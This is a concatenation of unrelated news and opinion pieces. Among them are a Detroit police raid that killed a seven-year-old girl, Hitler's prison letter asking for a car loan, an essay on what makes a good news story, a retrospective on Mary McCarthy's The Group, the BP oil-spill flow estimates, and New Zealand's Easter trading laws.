" Exactly what happened next is a matter still under investigation , but it appears the officer and the woman had some level of physical contact , " Godbee said in a statement Sunday .
" At about this time , the officer 's weapon discharged one round which , tragically , struck 7 - year - old Aiyana Stanley Jones in the neck / head area . "
Police were executing a search warrant in the search for the suspect in a shooting Friday that killed a high school student .
Godbee said the 34 - year - old suspect was found and arrested at the home where the girl was shot .
In addition , a vehicle and a moped matching the descriptions of those involved in the shooting of 17 - year - old Jarean Blake were also found , he said .
Fieger called the explanation from police " entirely false . "
" Of course , I have seen the videotape and the videotape vividly portrays the fact that a percussion grenade device was thrown through the front window and a shot was fired immediately from the outside from the porch , " he said .
" No murder suspect was found in Aiyana 's house , " Fieger said in Monday 's interview .
" In fact , there 's an upstairs apartment next door which the police did not have a search warrant for and that is where he surrendered , they went into that house too .
But he was not in Aiyana 's house . "
Aiyana 's father , Charles Jones , also has denied that the suspect was in his home .
Detroit police spokesman Phillip Cook told reporters Monday that he was not aware of the video and declined to comment .
The investigation , he said , has been taken over by state police to preserve the " community 's trust . "
A source at A&E , who asked not to be identified citing company policy , confirmed that a crew was on the scene and that the footage was confiscated by police .
He would not comment on what the crew had captured on video .
Another police spokesman said the department would not identify the suspect in Blake 's shooting death until he has been formally charged by prosecutors .
The suspect remains in custody .
Godbee , in his statement Sunday , said he wished to " express to the family of Aiyana Jones the profound sorrow that we feel within the Detroit Police Department and throughout this community .
We know that no words can do anything to take away the pain you are feeling at this time . "
Police obtained the " high - risk search warrant " based on intelligence , and it was approved by the prosecutor and a magistrate , Godbee said .
" Because of the ruthless and violent nature of the suspect in this case , it was determined that it would be in the best interest of public safety to execute the search warrant as soon as possible and detain the suspect ... while we sought a murder warrant . "

How an imprisoned Hitler wrote to a Mercedes dealership begging for a car loan
Adolf Hitler wrote to a Mercedez - Benz dealership while he was in jail asking for a loan or advance towards the 11/40 model he had his heart set on
He would one day control a huge chunk of the world – but in 1924 a struggling dictator - in - waiting was n’t beyond a little bit of pleading to get what he wanted .
A letter from Adolf Hitler seeking a loan to buy a Mercedes limousine is to be auctioned in Germany next month .
It was written from his cell at Landsberg Fortress jail where he was imprisoned that year after his nascent Nazi party tried , and failed , to seize power in Munich .
In jail he wrote Mein Kampf , the blueprint for power that would make him rich .
But when he wrote to Jakob Ferlin , owner of a Mercedes - Benz dealership in Munich , he had little money .
Hitler , who later owned a fleet of Mercedes cars , had his heart set on the 11/40 model which at the time cost 18,000 Reichsmarks .
‘ But the hardest thing for me at the moment lies in the fact that the biggest payment for my work is not expected until the middle of December , ’ he wrote in September 1924 .
‘ So I am compelled to ask for a loan or an advance .
‘ Naturally something in the order of several thousand marks would be a big help . ’
Hitler was freed from his five - year jail sentence in December 1924 .
But it is not known if the car dealer did business with him .
The letter was found at a flea market and authenticated by the Bavarian State Archive in Munich .
It was the copy of Hitler ’s letter kept by the prison ; the original went to Herr Ferlin and has been lost to history .
It is to be auctioned in Fuerth near Nuremberg in the first week of July and is expected to go for several thousand pounds .
Other documents up for sale will include prison papers which describe Hitler as : ‘ mature , calm and rational .
He is not expected to act against the state . ’
‘ He is modest and polite , ’ added a note from his prison governor .
The media - reform activist organization , Free Press , has set up a press - bashing site called mediaFail , offering minimal instruction about what constitutes a bad news story versus a good news story .
Thus we must assume those all - knowing Internet media critics who nominate bad news stories at mediaFail have a disciplined , instructive sense of what ’s good and what ’s bad .
So what is a good ( meaning well done ) news story ?
My answer revolves around three important concepts : useful information people do n’t know , adversarial purpose , and appropriate , meaningful context .
Eight years ago , my university ’s journalism school gave an award to Tom Wicker of The New York Times .
Wicker ’s “ In The Nation ” column ran in The Times from 1966 through 1992 , and his columns were sufficiently critical of Richard Nixon to earn Wicker a place on Nixon ’s enemies list .
In accepting our modest award , Wicker said , “ Find out what you can and tell the people what you know . ”
That ’s what good journalists are trained ( and love ) to do — find out stuff .
( Other occupations , such as scientists and explorers , do that too , but journalists do it in a hurry , on deadline , hoping sources are n’t lying , and … make mistakes in doing all that . )
Wicker , and journalists everywhere , get that : People need accurate information from credible sources — that ’s the traditional content of good news stories .
But that ’s changing , it seems .
In those same remarks , Wicker explained the mission of journalism : “ We stand against privilege and we must question power . ”
Now , for Wicker and tens of thousands of journalists who began plying this trade before the arrival of the Age of Internet Experts On Everything , this has been our calling .
It ’s what journalists must do in exchange for First Amendment protection against government interference .
It ’s why every day , my news editor , David James , wore a button on his leather vest proclaiming “ Question Authority . ”
Back then , for us , a good story explained to readers why we were telling them this , and why now , and why readers should care .
Good stories provided context .
That required a sufficient number of carefully chosen words ( not merely 140 characters ) .
Even USA
Today these days needs several hundred words per story despite its “ write tight , write bright ” philosophy .
Oh , yes , we needed still more carefully considered words to include who , what , when , where , why , how and so what — all by deadline .
And , of course , all these stories were “ objective ” ( wink , wink ) .
I ’ll return to that in a moment .
But the days of these “ good ” stories bred over decades of traditional journalistic practices were numbered .
Well - written and researched context is suffering the most .
Wicker saw this coming before most folks did .
In the preface to the 2002 edition of his book “ On The Record : An Insider ’s Guide to Journalism , ” he wrote :
I once thought of naming this book Lost in Cyberspace , and for good reason .
The old - fashioned craft of journalism , after all , seemed out of place in the astounding modern world of digital wizardry , global communications , the World Wide Web , e-mail , chips , bauds , dot - com addresses , electronically contrived backgrounds , million - dollar IPOs for techno - firms yet to earn a dollar , nerds too young to vote and too rich to care .
In such a new - fashioned world , journalism itself seemed dated and deservedly so , an ill - reputed relic in an e-attic , on the shelf with the rabbit - ear antennae and eight - track audio .
Wicker saw this eight years ago , before most of us realized that the hundreds - of - years - old business model of corporate - owned newspapers had begun to crumble because arrogance prevented recognition of the Internet as a viable business competitor or a credible provider of content — as defined by old - school diehards ( you know , like me ) .
In those eight years , the ability to transmit information has changed in remarkable ways .
It can be done instantaneously .
An individual with virtually no technical training can toss a factoid into the ether sans editor instantly and with minimal reflection on meaning .
The technology permitting this is exceedingly small , relatively inexpensive and easy to transport .
The big news van from Channel 7 is obsolete .
The staff photographer of The Daily News who does n’t write is history .
One man , one woman , can absorb all the functions that once required several people in a newsroom a mere five years ago .
But technological change has increased the probability that a story will be bad .
Speed kills .
Accuracy dies when hordes of people , each with an electronic device capable of transmitting a story , strive to be first to tell the world what they found out — without necessarily checking its veracity .
Context dies .
Because speed is the premium of the Internet era , the patience for explaining what does this mean is vanishing .
Tweets kill .
Successive waves of 140 - character messages are unlikely to carefully convey context , meaning and depth and breadth of description .
It ’s ironic that a generation branded with a short - attention span waits breathlessly for a succession of tweets — about what ?
And why ?
Yet technology can also enhance the probably that a story will be good .
Video reveals .
Iranian protests , campus shootings , man-made and natural disasters .
A cell phone with an 8 - megapixel camera can transmit digital video and audio worldwide .
The omnipresence of small devices capable of near - broadcast - quality video has ended the monopoly of broadcast and cable networks on news viewers can see .
That ’s bred CNN ’s world of “ iReporters . ”
( That , and because it costs nothing to put amateur video on the air rather than parachute at great expense a team into the news zone . )
Massive amounts of video reveals more .
So much nuance has been brought to millions because so many people in dangerous situations , with little to gain for themselves , pointed a cell phone camera at a riot , a flood , a fire , a protest where police are firing real bullets , a crime scene .
With the degraded size of the professional press corps , these many cell phones bring more eyes , minds and hearts to that which is news .
Whether I like it or not , the definition of a good news story is changing because telling news is no longer the exclusive province of professionals produced at journalism schools .
In 2004 , Technorati tracked 3 million blogs .
When it hit 112.8 million blogs , it changed its business model because blogs multiplied too swiftly to count any more .
Yet , hundreds of millions of people with blogs are all speaking and shouting and showing video and telling the world that this is what The Truth Really Is .
They ’re all telling stories .
Are those stories good or bad ?
And by what standards should we assess them ?
Again , Tom Wicker :
And since any clever hack can fill the Internet with gossip , propaganda , rumors and lies , what ’s the use of trained reporters and editors ?
In a universe moving inexorably into fakery — the virtual , the simulated , the hyped — who needs an old - world craft devoted , at its infrequent best , to merely reliable information , dispassionately presented ?
We all know why the number of good news stories by professional journalists has declined ( but not disappeared ) .
In the past few years , tens of thousands of experienced journalists have been turned out on the streets .
Mostly the young and less experienced remain .
The work load is high :
Where a reporter used to be required to seek out four or five sources for nuance , context and cross-checking for source credibility , now he or she may call just one .
That produces really bad stories .
There remains the ingrained reflex to be “ objective ” — the “ he said , she said ” journalism .
That means a reporter will call one representative of millions of people who believe X is True for a comment , and then call one representative of only a hundred people who believe X is False — and treat both reps the same in number of words , column inches , or minutes and ( or more likely ) seconds of air .
That ’s not a good news story .
Says Christiane Amanpour , who left CNN to host ABC ’s “ This Week ” :
Objectivity means trying to give all sides a hearing .
It does not , in my view , mean treating all sides as equal .
Sadly , virtually all sources who provide us information we want and need are subjective , providing information colored by their points of view .
Does that mean all news stories whose authors are deliberately subjective are bad ?
Not necessarily .
If a story ’s subjective bias is explained ( and I mean fully ) , then I have a context within which to determine its credibility .
After all , the youthful roots of American journalism were deeply infused with the subjective fertilizer of ideology and rampant deceit .
Remember the Maine , to hell with Spain !
What ’s a good story ?
Credibility and utility of a story lie in the eye ( and wisdom ) of the beholder .
If you ’re Jesse Ventura , former pro wrestler and former governor of Minnesota , here ’s your opinion of journalists : “ They ’ve always been dirtbags , and they still are . ”
If you ’re William E. Schmidt , assistant managing editor of The Times trying to defend your newspaper ’s credibility during the Jayson Blair scandal , here ’s what a good story does : “ Reporting is going out and getting facts and telling stories truthfully . ”
Kathleen Parker , a Pulitzer - winning columnist and a self - described conservative , after receiving a Tribune Company memo announcing the elimination of 200 jobs in the news division , said American journalism just plain sucks :
Let me be blunt .
Newspapers bite .
The work is n’t much fun anymore , thanks to the soul - snatching corporate culture that has euthanized newspaper personalities .
Most papers reflect that numbers - crunching , cubicle - hunkering mentality .
We ’re boring , predictable , staid , and out of touch with the folks with quarters .
Yet journalists of all stripes — us old newsroom hacks , freshly minted J - school grads , and bloggers with brains — still have a job to do , and that ’s to produce damn good stories .
Need reasons ?
Iraq .
Afghanistan .
The entire Bush administration .
The many unfulfilled promises of the Obama administration .
The hypocrisy of Congress .
Goldman Sachs .
The ghastly poverty rates and sky - high teen unemployment .
The decline of public education in America .
Climate change .
State budgets billions of dollars in the red , affecting the budgets of your city or town or school system .
Energy .
Nuclear waste .
Racism .
Gender inequalities in virtually every aspect of life .
Health care .
Deficits .
Will Bret Favre go back to the Vikes ?
Phil Bronstein , editor - at - large for the San Francisco Chronicle , nailed it :
Governments are in the business of manipulating information to achieve their goals .
We are in the business of illuminating reality .
Those two objectives are often in conflict .
Now just add “ and corporations ” after “ government ” and you ’ll see the need for good , really well done news stories .
As for me , I ’ll stick with the philosophy of Lazarus Long , a fictional character created by sci- fi writer Robert A. Heinlein , in “ Time Enough for Love ” :
What are the facts ?
Again and again and again — what are the facts ?
Shun wishful thinking , ignore divine revelation , forget what ‘ the stars foretell , ’ avoid opinion , care not what the neighbors think , never mind the unguessable ‘ verdict of history ’ …
What are the facts , and to how many decimal places ?
You pilot always into an unknown future ; facts are your single clue .
Get the facts !
Then I ’ll make up my own mind whether the story ’s good or bad .
When it was first published in 1963 , The Group rapidly became a book that everyone read without wanting to admit it .
Its frank descriptions of sex , contraception and breast - feeding as they affected a group of eight female graduates in 1930s America caused such a scandal that the novel was banned in Australia as an offence to public morals .
Norman Mailer , a man whose own writing did not shy away from graphic depictions of the sexual act , dismissed The Group in the New York Review of Books as " a trivial lady writer 's novel " infused with a " communal odour [ that ] is a cross between Ma Griffe and contraceptive jelly " .
The book 's author , Mary McCarthy , was not expecting such a furore .
In spite of her status as one of America 's leading women of letters , a writer with a reputation for acerbic insights and penetrating prose , she found that the intellectual , liberal circles in which she moved were quick to disparage her bestseller as little more than a superficial potboiler .
At a dinner party in New York two months after its publication , the 51 - year - old McCarthy burst into tears when a fellow guest admitted that he did not like the book , and when her close friend , the critic Elizabeth Hardwick , wrote a mean - spirited satire in the Partisan Review , McCarthy was hurt and puzzled by the betrayal .
For years afterwards , McCarthy received letters from irate readers accusing her of a " perverted outlook on life " .
She was shunned by her former university contemporaries , many of whom felt they had been mercilessly pilloried in the book .
Despite the fact that The Group went on to top the New York Times bestseller list for almost two years , the experience was still raw enough for McCarthy to admit in a 1989 newspaper interview shortly before her death that she thought The Group had " ruined my life " .
And yet it is for The Group that McCarthy is best remembered .
Although many critics , like Mailer , argued that her earlier , less well - known works showed greater promise – her first novel , The Company She Keeps , published in 1942 , or the autobiographical Memories of a Catholic Girlhood – The Group would become more influential than any of them .
It had a lasting impact on subsequent generations of female writers , many of whom were struck by the candour and veracity of McCarthy 's prose at a time when such things were simply not openly discussed and especially not by women .
" She talked about the things you knew , " says the award - winning biographer Claire Tomalin , who first read The Group as a young married woman with small children .
" It all rang true .
She opened a further door into brutal frankness .
There was something so crisp and clever and bold about her writing . "
McCarthy did not shy away from the discomfiting or the indiscreet .
In one early scene , the sexually inexperienced Dottie Renfrew gets fitted for a Dutch cap after a one - night stand with a self - confessed bounder .
In a later chapter , the eager - to - please Priss Hartshorn is shown struggling to breast - feed her newborn baby in order to test the new theories of motherhood espoused by her paediatrician husband .
For Tomalin , and others like her , such scenes spoke directly to their own experience .
The timelessness of McCarthy 's subject matter has prompted Virago to republish The Group next month for a new audience .
On rereading , it becomes immediately apparent that McCarthy 's characters confront many of the same issues as their modern counterparts : sex and contraception , career and marriage , love and lust , fidelity to one 's husband versus loyalty to one 's friends and the attempt to carve out a place for oneself unconstrained by the gender limitations of previous generations .
Its continuing relevance is one of the book 's most extraordinary attributes .
When Candace Bushnell was advised by an editor in the early 1990s to write " the modern - day version of The Group " , she responded with Sex and the City , a collection of confessional essays about a group of female friends that spawned a multimillion - dollar TV series and film .
" The Group reminds us that not much has really changed , " writes Bushnell in the foreword to the new edition .
" It 's a book I prize , not only for its blistering satire , but for its technical elements , including McCarthy 's brilliant use of the soliloquy , her pacing and razor - sharp descriptions . "
For Hilary Mantel , whose most recent novel , Wolf Hall , won this year 's Booker prize , The Group is " absorbing , funny , painful … a beautifully managed novel … I consider it a masterpiece " .
For AS Byatt , it was " the energy and brio of the storytelling " that first caught her imagination .
" Also , the hard - headed descriptions of sex and contraceptives were cool and funny .
I think the area in which it most affected my own work was its precise candour about sex . "
Byatt adds : " I did n't ( and do n't ) think of The Group as a ' feminist novel ' .
It was a novel about a group of women from which most feminists could learn things – about moral and emotional traps set by society , for instance – but its intention was literary , storytelling , shocking rather than forwarding a cause . "
Although McCarthy repeatedly distanced herself from the idea of being a " feminist " writer ( she once described feminism as a cocktail of " self - pity , shrillness and greed " ) , her insistence on seeing women as they truly were , rather than how society wanted them to be , was in its own way revolutionary .
The Group was published at a time of considerable flux in America .
It was the year that Kennedy was assassinated , a time when the myth of the contented domesticity of previous generations was beginning to be challenged .
A few months before it came out , Betty Friedan had published The ­ Feminine Mystique , a sociological study that brought to light the lack of fulfilment in women 's lives based on the results of a questionnaire sent to 200 of her university contemporaries .
Friedan called it " the problem with no name " : the nagging dissatisfaction that lay at the heart of many women 's experience despite a gloss of financial security .
McCarthy 's novel was set in 1933 , but it dealt with precisely the same issues that Friedan had identified .
In The Group , the female characters set out to make their own way in Roosevelt 's New Deal America , only to discover that they are just as economically and emotionally dependent on men as their mothers were .
They believe in romantic love even though it costs them their independence and their idealistic , liberal politics come to nothing when the novel ends with the outbreak of the Second World War .
It was the women 's submissiveness that most enraged Norman Mailer , who claimed that McCarthy 's novel was fatally diminished by the fact that none of her characters has " the power or dedication to wish to force events " , while conspicuously missing the point that it was precisely this enforced passivity that McCarthy wished to highlight .
In this , she was undoubtedly informed by her own life .
By the time The Group was published , McCarthy had been married four times – her second husband , the literary critic Edmund Wilson , refused to allow her to keep her own bank account and , according to McCarthy , had her committed to a psychiatric hospital against her will , claiming she was " hysterical " .
McCarthy had endured a troubled childhood – both her parents died in the 1918 flu epidemic and she was sent to live with a great aunt and uncle , whom she later accused of having violently beaten her on a daily basis .
It was when McCarthy won a place at Vassar , the single - sex , liberal arts college in Poughkeepsie , New York , that she rapidly set about reinventing herself .
Vassar represented academic success and an escape from her difficult upbringing , but in spite of her ferocious intelligence , McCarthy never felt she was fully accepted into the socially elite milieu in which she found herself .
She came to rely on her intellect to win her friends , but it rewarded her with admiration rather than acceptance and she was left feeling like an outsider .
The status of outsider is arguably what minted McCarthy 's reputation as a writer .
Her early short stories and essays display her incisive critical eye and an ability to record every detail with unflinching accuracy .
" She felt she had a kind of obligation to tell the truth as she saw it , " says her son , Reuel Wilson .
" She was a very meticulous chronicler of the minor details of everyday life : what people ate , what they wore , what they drank . "
McCarthy 's detractors criticise her for concentrating on the outward ephemera of her characters ' lives rather than giving them psychological depth , but in The Group her ability to convey a personality with the precision of a single phrase is deployed to devastating effect .
Self - important Norine Schmittlapp , for instance , is described as living in a squalid apartment that smells of " soured dishcloth " .
" Bedding with her… must be like rolling in a rich mouldy compost of autumn leaves , crackling on the surface , like her voice , and underneath warm and sultry from the chemical processes of decay . "
For McCarthy 's Vassar contemporaries , many of whom appeared as recognisable characters in the novel , it was difficult not to feel that old scores were being settled .
To them , McCarthy 's satirical tone seemed perilously close to naked contempt – as though having failed to assimilate she was now determined to retaliate .
In Seeing Mary Plain , Frances Kiernan 's 2000 biography of McCarthy , several of McCarthy 's former Vassar classmates are quoted as being unhappy about their portrayal .
One of them claimed that McCarthy was " trying to make up for the fact that she always felt socially inferior " .
McCarthy was stung by the fallout at first , insisting that her characters were composites .
But a year after The Group 's publication , she told the New York Herald Tribune that the book had indeed resulted from " putting real plums into an imaginary cake " .
By that stage , it was clear that the unintended consequence of the novel 's popularity was to cement the outsider status McCarthy had been so keen to shed .
Although The Group brought her a vastly larger audience , its publication resulted in McCarthy being rejected by both the Vassar classmates whose social poise she envied and the highbrow artistic friends whose intellect she admired .
Was it worth it ?
McCarthy would no doubt have quarrelled with the premise of the question – in 1984 , five years before her death from lung cancer , she was still feisty enough to declare : " To be disesteemed by people you do n't have much respect for is not the worst fate . "
Her later works and her 26 - year correspondence with the political theorist Hannah Arendt did much to restore McCarthy 's reputation as one of America 's leading intellectuals .
But in spite of all her brilliance , or perhaps because of it , McCarthy never quite fitted into the group she wrote about .
She became her own woman and that , no doubt , was just how she would have wanted it .
JERUSALEM : Speculation was widespread in Israel last night over the identity of a mysterious prisoner being held for unspecified crimes in the maximum security Ayalon jail .
Dubbed '' Mister X '' by the Hebrew language news website Y - net , the man 's identity has even been kept from his guards .
A measure of the severity of the crimes for which the man in being held is the fact that he is being housed in the cell that was built for Yigal Amir , the assassin of the former Israeli prime minister Yitzhak Rabin .
According to Y - net , nobody knows who the man is and with what he has been charged .
Nobody talks to him , nobody sees him , nobody visits him , nobody knows he is in jail .
'' He was placed in full and complete separation from the outside world , '' one prison service official quoted by Y - net said .
BP and White House continue cover - up of oil spill
By Hiram Lee
8 June 2010
As BP ’s latest efforts to stem the flow of oil from the leaking well in the Gulf of Mexico continue to face difficulties , there are new details emerging about attempts by BP and the Obama administration to cover up the true size of the disaster .
It has been revealed that the US Department of the Interior intentionally misrepresented the results of a recent survey of the spill by federal scientists in an attempt to minimize the scope of the disaster .
Last week the Interior Department released a statement to the press with a new estimate placing the amount of oil leaking into the Gulf at 12,000 to 19,000 barrels per day .
The numbers came from a survey conducted by the National Incident Command ’s Flow Rate Technical Group , a team consisting of government scientists and representatives from universities across the US .
The White House stood by the new estimates and BP executive Robert Dudley appeared on national television to promote them .
In reality , the scientists conducting the survey reported this estimate only reflected the “ lower bounds ” of their findings , meaning that the numbers represented the very least possible amount of oil flowing into the Gulf .
The National Incident Command scientists had not yet arrived at an estimate for the “ upper bounds ” when the Interior Department released its statement and the scientists say the upper estimate could be “ significantly larger . ”
The Interior press release declared the estimate of 12,000 to 19,000 barrels represented “ the lower and upper boundaries ” of the study , meaning no more than 19,000 barrels of oil were spilling into the Gulf each day .
The falsification of the flow rate study by the Interior Department is the latest step in a deliberate effort by BP and the Obama administration to conceal the true dimensions of the oil spill .
Immediately following the April 20 explosion of BP ’s Deepwater Horizon rig , in which 11 workers lost their lives , BP reported there had been no oil spill at all resulting from the blast .
Unable to maintain this assertion , BP then relented and admitted to a spill of 1,000 barrels per day .
When this claim became untenable , the next estimate to be promoted was that of the National Oceanic and Atmospheric Administration , placing the size of the spill at 5,000 barrels per day .
BP maintained this version of events until the end of May .
All estimates produced by BP and the White House have drawn criticism from scientists throughout the country who have conducted their own independent studies of video footage of the leaking well provided by BP , under pressure .
Steven Wereley , an engineering professor at Purdue University , estimates the size of the spill could be as large as 84,000 barrels per day .
Eugene Chiang , a professor of astrophysics at the University of California , Berkeley , found the size of the spill could be as large as 100,000 barrels per day .
BP has good reason for wanting a cover -up of the true size of the disaster .
While the amount BP can be made to pay for environmental and economic damages resulting from the spill is capped at $ 75 million , under the Clean Water
Act the company can face civil fines of up to $ 4,300 for every barrel of oil spilled into the ocean .
Were the government to use BP ’s original estimates of 1,000 barrels spilled per day , the company would stand to lose $ 215 million for the first 50 days of the disaster .
Utilizing the more realistic estimates of independent scientists , the oil giant could be fined hundreds of billions of dollars .
BP ’s latest attempt to halt the flow of oil into the Gulf is itself a graphic exposure of the extent of the spill and its cover - up by BP and the White House .
BP has now placed a cap over what remains of a riser pipe connected to the failed blowout preventer .
The leaking oil is being siphoned off through another riser pipe connected to BP ’s Discover Enterprise ship on the surface of the Gulf .
Approximately 11,000 barrels were reportedly collected by BP on Sunday .
This number itself would expose as a lie all estimates of the spill promoted by BP since day one of the disaster .
Video feeds indicate massive amounts of oil not collected by the new containment system continue to gush into the open water through four vents in the cap currently in use .
BP has attempted to close the vents in order to prevent the oil from leaking into the water , but there is currently more oil flowing from the leak than can be safely processed by the containment ship , which is unable to take on more than 15,000 barrels of oil each day .
Only one vent has been closed thus far due to fears that the pressure resulting from the overwhelming amount of oil flowing through the system could cause a catastrophic failure .
BP has announced plans to send another ship to assist in siphoning oil from the leaking well .
Next month , the oil giant intends to replace the cap currently being used with a system that might better handle the enormous amount of oil that continues to gush from the ocean floor .
The spill will most likely not be fully contained until relief wells are put in place , a process that will not be completed until mid-August at the earliest .
The cleanup of the oil already spilled into the Gulf will continue for years .
More of That Good Ole Christian Hypocrisy !
My main complaint with the Hard Right Christians is their hypocrisy .
They go to church , carry bibles around with them , and are always praying to Jesus for something or other .
The fact is , however , that hypocrisy knows no bounds .
This little cartoon is a perfect example of what I mean :
A Queens woman has filed a suit against ConAgra , the makers of microwaveable Act II popcorn , claiming she came down with " popcorn lung " after inhaling the vapors from the buttery snack .
Agnes Mercado says she consumed the popcorn twice a day for 16 years , and is just one of many consumers suing over exposure to the additive biacetyl ( or diacetyl ) , which gives the popcorn a buttery taste .
She told the Daily News , " I was eating two or three bags of popcorn a day .
I did n't know it would destroy my lungs . "
Though ConAgra stopped using the additive in 2007 , many factory workers have also sued the company for exposure to biacetyl in the workplace , which has cost them over $ 100 million in settlements .
Mercado says inhaling the vapors from 1991 to 2007 resulted in her bronchiolitis obliterans , an airway obstruction that does not respond to any medicine .
She now must carry an oxygen tank with her at all times , and has been confined to a desk job at a nursing home in Far Rockaway .
Lawyer Wendy Fleishman said , " She just had a horrible reaction to this .
It should never have been added to microwave popcorn or any other food . "
The suit also claims she is likely to require a lung transplant .
Random , repetitive .
Boring .
Its just a grinding game , where random chance decides if you win or not .
Roll a dice , and - Maybe - you wont get crushed by the ennemy .
We can make our own decks .. nice , but last card ( as said in a previous entry ) doesnt seem to appear .. ever .
This game is boring because of the randomness of it all .
There is nearly no player skill involved at all .
The points you get are for graphic , interface and all the programming .
They were nice .
But the - game - isnt fun at all .
Child of War Turned Peace Activist : Phan Thi Kim Phuc
Remember the photo of a little girl running naked down the street , covered in napalm ?
Amazingly , she survived the horrors of the Vietnam War -- and grew up to become a world - renowned activist for peace and forgiveness .
It ’s one of the most iconic images of the 20th century : A young Vietnamese girl running from her village , naked , her clothes burned away in a napalm attack .
Her mouth is wide , her face filled with terror and anguish .
This photo , Vietnam Napalm , by Nick Ut , was taken in 1972 , just after American troops accidentally dropped a load of napalm from the sky , demolishing the Vietnamese town of Trang Bang .
The stark , disturbing image was awarded the Pulitzer Prize for addressing the realities of the war in Vietnam , and served as a wake - up call to millions of Americans who had not realized the damage that was being done to innocent civilians like that scared , naked child , running down the street on fire .
For millions of people who saw that image , the young girl in the photo would forever remain nameless – no more than a symbolic innocent , ruined by the atrocities of war .
Most people would n’t know whether she survived , or if she passed away moments after the click of the shutter .
Her future , if she had one at all , was bound to be grim .
The reality of the situation may come as a surprise :
The young , terrified girl in that photo , Phan Thi Kim Phuc , is now a 45 - year old woman .
She is a wife and a mother , and is now a Canadian citizen .
Most surprising of all , though , is the fact that she has devoted her life to becoming an ambassador for peace , and has established a nonprofit organization called KIM Foundation International , which is dedicated to helping children who ’ve been traumatized by war to heal , providing both medical and social services to support their recovery .
Despite all the pain she has faced , Kim has forgiven her attackers wholeheartedly .
In a 1996 Veteran ’s Day address to Vietnam War veterans , Kim said , “ Even if I could talk face to face with the pilot who dropped the bombs , I would tell him we cannot change history but we should try to do good things for the present and for the future to promote peace . ”
Recently , she had the opportunity to meet that pilot face - to - face – and she has since forged a close bond with him .
Though Kim bears scars , both physical and emotional , she has moved past the hatred she once felt , and now believes that her horrific experiences were meant to teach her a powerful lesson .
“ I knew that I had been saved that day because I had a higher purpose in life , ” she recently told an audience in Deer Lake , Canada .
“ Having known suffering and agony , I now know the value of reaching out to help others .
“ Having known war , I now know the value of peace .
Having lived with pain , I know the value of love .
Having lost everything , I now know the value of cherishing everything I have that ’s important and having known hatred , I now know the value and the power of faith and forgiveness . ”
“ I learned that forgiveness is far more powerful than any weapon of war , ” Kim said .
“ If the little girl in that picture can do it , then you can do it too . ”

Calls for greater consistency in Easter trading laws were being aired again yesterday as some Wanaka traders continued their tradition of defying the law .
Last night , the Department of Labour advised it had made six visits to shops in the South Island to places observed open and trading .
Information on the location of the shops was withheld by the department because prosecutions were still to be considered .
Inspectors found 19 shops trading throughout the country , the department said .
Shops risk a fine of up to $ 1000 by opening .
One retailer who has opened his store every Good Friday for the past 11 years and been fined twice is Wanaka Kodak owner and manager Steve Worley .
" We have to be open .
There 's a major photographic event on in town , " he said , referring to the Warbirds Over Wanaka airshow , which has attracted thousands of tourists this weekend .
Mr Worley believed it " looked bad " for Wanaka if he was not able to provide a service many people required .
He had emailed Waitaki MP Jacqui Dean to see if a petition from retailers would help change the Shop Trading Hours Repeal Act 1990 , which specifies three and a - half days each year on which most New Zealand retailers must close : Christmas Day , Good Friday , Easter Sunday and until 1 pm on Anzac Day .
Mrs Dean is readying another attempt to change the law - this time in the form of a local authority Bill - after her own private member 's Bill was defeated 87 - 34 in May 2007 .
The new Bill will seek to extend an existing exemption , which applies to Queenstown and allows retailers there to trade during Easter , to apply across the whole of the Queenstown Lakes district , Mrs Dean said .
Mr Worley said he hoped the change of Government would promote a rethinking of the issue .
" We are in a recession and we need every dollar we can get under a trading point of view . "
Most of Helwick
St 's clothing stores were open for business and business was good , Cherry manager Lara James said .
The fashion store had been " really busy " .
The Department of Labour had not visited by 1 pm , but she said any fine would be outweighed by yesterday 's profits .
" Hopefully , we do n't get fined because we are still a tourist town like Queenstown . "
Auckland Newmarket Business Association chief executive Cameron Brewer said yesterday the laws were absurd and needed to be updated .
Wanaka would have 80,000 visitors over the weekend , yet businesses that wanted to service the public could only do so by breaking the law .
There needed to be an exemption programme which enabled places like Wanaka to remain open .
There needed to be consistency for tourist towns .
He also questioned the practice of prosecuting shops that opened against the rules , describing it as a " futile and costly exercise and a complete farce " .
National Distribution Union vice - president Margaret Dornan said keeping Easter trading laws were critical so workers could have guaranteed time off .
" You 've only got three and a - half days a year when shops are n't open .
Retail workers I speak to ask when they are supposed to get some time off with their family if shops opened over Easter , " she said .
Labour Department inspectors said they found five shops trading in Auckland and four in Wellington .
One shop was open and trading in Hamilton , one in Napier and one in Palmerston North .
HOLIDAY TRADING
• Most New Zealand retailers must close on Christmas Day , Good Friday , Easter Sunday and until 1 pm on Anzac Day .
• Shops which may open include dairies , service stations , cafes and shops providing services rather than goods , such as hairdressers , pharmacies and souvenir shops .
• Conditions apply to what may be sold .
• Garden centres are allowed to open on Easter Sunday but not the other days .
• Tourist towns such as Taupo and Queenstown have some exemptions to the restrictions .

IN A bid to create a warm , cuddly , tolerant brand of Islam in the UK , and also counter negative views of Muslims in Britain , the Exploring Islam Foundation has launched a series of Inspired by Muhammad ads in London .
A spokesman for Quilliam Foundation , a counter - extremism think tank which seeks to promote a “ British Islam . . . Â free from the bitter politics of the Arab and Muslim world ” , told London ’s Independent :
This campaign is important because it can help non-Muslims to better understand the faith that inspires and guides their Muslim friends , neighbours and colleagues .
This initiative also helps British Muslims reclaim the Prophet Mohamed as a time - honoured guide for peace , compassion and social justice from those who seek to twist his teachings .
According to Islamonline , a YouGov poll of 2,152 adults conducted for the foundation last month found that 58 percent associated the Religion of Peace with extremism and 50 percent associated the religion with terrorism .
Only 13 percent thought Islam was based on peace and six percent associated it with justice .
Asked if Muslims had a positive impact on British society , four in 10 disagreed .
The poll also found that 69 percent thought Islam encouraged the repression of women .
Said the foundation ’s campaigns director Remona Aly .
We are very concerned about the way our faith is perceived by the public .
We want to foster a greater understanding of what British Muslims are about and our contribution to British society .
We are proud of being British and being Muslim .
A spokesman for Quilliam said :
We welcome the Inspired By Muhammad campaign as a valuable and timely step to help improve relations and foster deeper understanding between British citizens .
More than 50 percent of Americans said they had unfavourable opinions of Islam , while 29 percent of those reported a strong degree of prejudice towards Muslims .
A recent survey in the US revealed that Islam has a pretty poor image there too According to a new report from the Gallup Center for Muslim Studies :
Gallup questioned 1,002 interview subjects about different aspects of Islam and Muslims over a month - long period last year and married the results with those found in the Gallup World Religion survey , which surveyed Americans ’ opinions on Buddhism , Christianity , Judaism and Islam and their followers .
Of the faiths , Islam and Muslims elicited the most negative perceptions .
Senior analyst Dalia Mogahed , who is the Executive Director for the Gallup Center for Muslim Studies , noted that though more than half of respondents said they knew someone who was Muslim , that did n’t deter from having negative attitudes towards Islam .
